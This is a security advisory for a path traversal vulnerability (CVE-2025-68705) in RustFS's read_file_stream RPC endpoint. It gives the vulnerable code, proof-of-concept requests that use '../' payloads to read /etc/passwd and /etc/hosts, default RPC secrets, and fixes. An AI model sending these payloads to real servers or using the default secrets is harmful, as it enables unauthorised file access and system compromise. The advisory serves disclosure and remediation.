# [H] RustFS Path Traversal Vulnerability

## Summary
Severity: High
Advisory: GHSA-pq29-69jg-9mxc
CVE: CVE-2025-68705
CWE: CWE-22
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-07
Source: https://github.com/advisories/GHSA-pq29-69jg-9mxc
Type: github-advisory

## Affected
- crates.io: `rustfs` — affected >=1.0.0-alpha.13 <1.0.0-alpha.79

## Details
# RustFS Path Traversal Vulnerability

## Vulnerability Details

- **CVE ID**: 
- **Severity**: Critical (CVSS estimated 9.9)
- **Impact**: Arbitrary File Read/Write
- **Component**: `/rustfs/rpc/read_file_stream` endpoint
- **Root Cause**: Insufficient path validation in `crates/ecstore/src/disk/local.rs:1791`

### Vulnerable Code

```rust
// local.rs:1791 - No path sanitization!
let file_path = volume_dir.join(Path::new(&path)); // DANGEROUS!
check_path_length(file_path.to_string_lossy().to_string().as_str())?; // Only checks length
let mut f = self.open_file(file_path, O_RDONLY, volume_dir).await?;
```

The code uses `PathBuf::join()` without:
- Canonicalization
- Path boundary validation
- Protection against `../` sequences
- Protection against absolute paths

## Proof of Concept

### Test Environment

- **Target**: RustFS v0.0.5 (Docker container)
- **Endpoint**: `http://localhost:9000/rustfs/rpc/read_file_stream`
- **RPC Secret**: `rustfsadmin` (from RUSTFS_SECRET_KEY)
- **Disk ID**: `/data/rustfs0`
- **Volume**: `.rustfs.sys`

### Attack Scenario

#### Exploit Parameters

```
disk: /data/rustfs0
volume: .rustfs.sys
path: ../../../../etc/passwd  # Path traversal payload
offset: 0
length: 751  # Must match file size
```

#### Required Authentication

RPC requests require HMAC-SHA256 signature:

```python
# Signature format: HMAC-SHA256(secret, "{url}|{method}|{timestamp}")
Headers:
  x-rustfs-signature: Base64(HMAC-SHA256(secret, data))
  x-rustfs-timestamp: Unix timestamp
```

### Successful Exploits

#### 1. Read `/etc/passwd` ✅

**Request:**
```
GET /rustfs/rpc/read_file_stream?disk=/data/rustfs0&volume=.rustfs.sys&path=../../../../etc/passwd&offset=0&length=751
x-rustfs-signature: QAesB6sNdwKJluifpIhbKyhdK2EEiiyhpvfRJmXZKlg=
x-rustfs-timestamp: 1766482485
```

**Response:** HTTP 200 OK

**Content Retrieved:**
```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
[... 15 more lines ...]
rustfs:x:10001:10001::/home/rustfs:/sbin/nologin
```

**Impact**: Full user account enumeration

---

#### 2. Read `/etc/hosts` ✅

**Request:**
```
GET /rustfs/rpc/read_file_stream?disk=/data/rustfs0&volume=.rustfs.sys&path=../../../../etc/hosts&offset=0&length=172
```

**Response:** HTTP 200 OK

**Content Retrieved:**
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
[...]
172.20.0.3	d25e05a19bd2
```

**Impact**: Network configuration disclosure

---

#### 3. Read `/etc/hostname` ✅

**Request:**
```
GET /rustfs/rpc/read_file_stream?disk=/data/rustfs0&volume=.rustfs.sys&path=/etc/hostname&offset=0&length=13
```

**Response:** HTTP 200 OK

**Content Retrieved:**
```
d25e05a19bd2
```

**Impact**: System information disclosure

---

## Technical Analysis

### Data Flow

```
1. HTTP Request
   ↓
2. RPC Signature Verification (verify_rpc_signature)
   ↓
3. Find Disk (find_local_disk)
   ↓
4. Read File Stream (disk.read_file_stream)
   ↓
5. VULNERABLE: volume_dir.join(Path::new(&path))
   ↓
6. File Read: /data/rustfs0/.rustfs.sys/../../../../etc/passwd
              → /etc/passwd
```

### Path Traversal Mechanism

```rust
// Example traversal:
volume_dir = PathBuf::from("/data/rustfs0/.rustfs.sys")
path = "../../../../etc/passwd"

// PathBuf::join() resolves to:
file_path = "/data/rustfs0/.rustfs.sys/../../../../etc/passwd"
          = "/etc/passwd"  // Successfully escaped!
```

### Why It Works

1. **No Canonicalization**: Code doesn't use `canonicalize()` before validation
2. **No Boundary Check**: No verification that final path is within volume_dir
3. **PathBuf::join() Behavior**: Automatically resolves `../` sequences
4. **Length-Only Validation**: `check_path_length()` only checks string length

### Special Considerations

- **File Size Constraint**: The `length` parameter must exactly match file size
  - Code validates: `file.len() >= offset + length`
  - Otherwise returns `DiskError::FileCorrupt`
- **Volume Requirement**: Volume/bucket must exist (e.g., `.rustfs.sys`)
- **Disk Requirement**: Disk must be registered in `GLOBAL_LOCAL_DISK_MAP`

## Impact Assessment

### Confidentiality Impact: HIGH

- ✅ Read arbitrary files (demonstrated)
- ✅ Read system configuration files (`/etc/passwd`, `/etc/hosts`)
- ⚠️ Potential to read:
  - SSH keys (`/root/.ssh/id_rsa`)
  - Application secrets
  - RustFS configuration files
  - Environment variables from `/proc`

### Integrity Impact: HIGH

- ⚠️ Similar vulnerability exists in `put_file_stream` (not tested)
- ⚠️ Arbitrary file write likely possible
- ⚠️ Could write to:
  - Cron jobs
  - authorized_keys
  - System binaries (if permissions allow)

### Availability Impact: MEDIUM

- ⚠️ `walk_dir` endpoint could enumerate entire filesystem
- ⚠️ Potential DoS via recursive directory traversal

## Exploitation Requirements

### Prerequisites

1. **Network Access**: Ability to reach RustFS RPC endpoints
2. **RPC Secret Knowledge**: Knowledge of RUSTFS_SECRET_KEY
   - Default: `"rustfs-default-secret"`
   - Production: From environment variable or config
3. **Disk/Volume Knowledge**: Valid disk ID and volume name
4. **File Size Knowledge**: Exact file sizes for successful reads

### Attack Complexity

- **Without Secret**: Impossible (signature verification)
- **With Secret**: Trivial (automated script)
- **With Default Secret**: Critical risk if not changed

## Mitigation Recommendations

### Immediate Actions (Priority 0)

1. **Path Canonicalization**
```rust
async fn read_file_stream(&self, volume: &str, path: &str, ...) -> Result<FileReader> {
    let volume_dir = self.get_bucket_path(volume)?;

    // CRITICAL FIX:
    let file_path = volume_dir.join(Path::new(&path));
    let canonical = file_path.canonicalize()
        .map_err(|_| DiskError::FileNotFound)?;

    // Validate path is within volume_dir
    if !canonical.starts_with(&volume_dir) {
        error!("Path traversal attempt detected: {:?}", path);
        return Err(DiskError::InvalidArgument);
    }

    // Continue with validated path...
}
```

2. **Path Component Validation**
```rust
// Reject dangerous path components
if path.contains("..") || path.starts_with('/') {
    return Err(DiskError::InvalidArgument);
}
```

3. **Use path-clean Crate**
```rust
use path_clean::PathClean;

let cleaned_path = PathBuf::from(&path).clean();
if cleaned_path.to_string_lossy().contains("..") {
    return Err(DiskError::InvalidArgument);
}
```

### Additional Security Measures

4. **Audit Logging**: Log all RPC file operations with full paths
5. **Rate Limiting**: Prevent DoS via repeated RPC calls
6. **Secret Rotation**: Ensure unique RPC secrets per deployment
7. **Network Segmentation**: Restrict RPC endpoint access
8. **Security Testing**: Add path traversal tests to test suite

### Long-term Improvements

9. **Chroot Jail**: Isolate RPC operations in chroot environment
10. **Least Privilege**: Run RustFS with minimal file system permissions
11. **Security Audit**: Comprehensive review of all file operations

## Proof of Concept Script

The complete PoC is available at: `exploit_path_traversal.py`

### Usage

```bash
# Ensure RustFS is running
docker compose ps

# Run exploit
python3 exploit_path_traversal.py
```

### Output

```
[+] SUCCESS! Read 751 bytes
[+] File content:
================================================================================
root:x:0:0:root:/root:/bin/sh
[... full /etc/passwd content ...]
================================================================================
```

## Acknowledgements

RustFS would like to thank **bilisheep** from the **Xmirror Security Team** for discovering and responsibly reporting this vulnerability.

Acknowledgements: RustFS would like to thank @realansgar and  **bilisheep** from the **Xmirror Security Team** for providing the security report.

## References
- https://github.com/rustfs/rustfs/security/advisories/GHSA-pq29-69jg-9mxc
- https://nvd.nist.gov/vuln/detail/CVE-2025-68705
- https://github.com/rustfs/rustfs/commit/ab752458ce431c6397175d167beee2ea00507d3e
- https://github.com/rustfs/rustfs
